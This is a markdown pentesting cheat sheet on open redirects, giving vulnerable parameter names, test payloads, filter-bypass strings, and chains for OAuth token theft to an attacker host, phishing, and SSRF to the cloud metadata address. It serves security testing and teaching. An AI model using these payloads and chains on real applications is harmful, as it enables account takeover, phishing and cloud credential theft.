# Open Redirect

## Overview
Open redirect occurs when an application redirects users to a URL taken from user input without validation. While low severity on its own, open redirects become critical when chained with OAuth flows, phishing, or SSRF.

## When This Happens

- Login redirects: `/login?redirect=/dashboard` → `/login?redirect=https://evil.com`
- Logout redirects: `/logout?next=https://evil.com`
- Any `?url=`, `?redirect=`, `?next=`, `?return=`, `?dest=`, `?continue=` parameter

## Detection

### Common parameters
```
?url=          ?redirect=       ?next=          ?return=
?returnUrl=    ?redir=          ?dest=          ?destination=
?continue=     ?go=             ?target=        ?link=
?redirect_uri= ?return_to=      ?checkout_url=  ?image_url=
```

### Test payloads
```
https://evil.com
//evil.com
/\evil.com
//evil.com/%2f..
https://target.com@evil.com
https://target.com.evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Filter Bypass Techniques

| Filter | Bypass |
|--------|--------|
| Must start with `/` | `//evil.com` (protocol-relative) |
| Must contain `target.com` | `https://target.com@evil.com` or `https://target.com.evil.com` |
| Blocks `//` | `/\/evil.com`, `/%2f/evil.com` |
| Blocks external URLs | `https://target.com/redirect?url=/\evil.com` |
| JavaScript disabled | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |

## Chaining for Impact

### Open Redirect → OAuth Token Theft
```
1. Find open redirect: target.com/redirect?url=ATTACKER
2. OAuth callback uses: redirect_uri=https://target.com/callback
3. Chain: redirect_uri=https://target.com/redirect?url=https://attacker.com
4. OAuth token sent to attacker → account takeover
```

### Open Redirect → Phishing
```
Legitimate-looking link: https://target.com/redirect?url=https://login-target.evil.com
→ Victim trusts the target.com domain
→ Redirected to phishing page
```

### Open Redirect → SSRF
```
If server follows redirects:
?url=https://your-server.com/redirect → 302 → http://169.254.169.254
```

## References

- `techniques/ssrf-server-side-request-forgery.md`
- `methodology/exploitation-methodology.md`
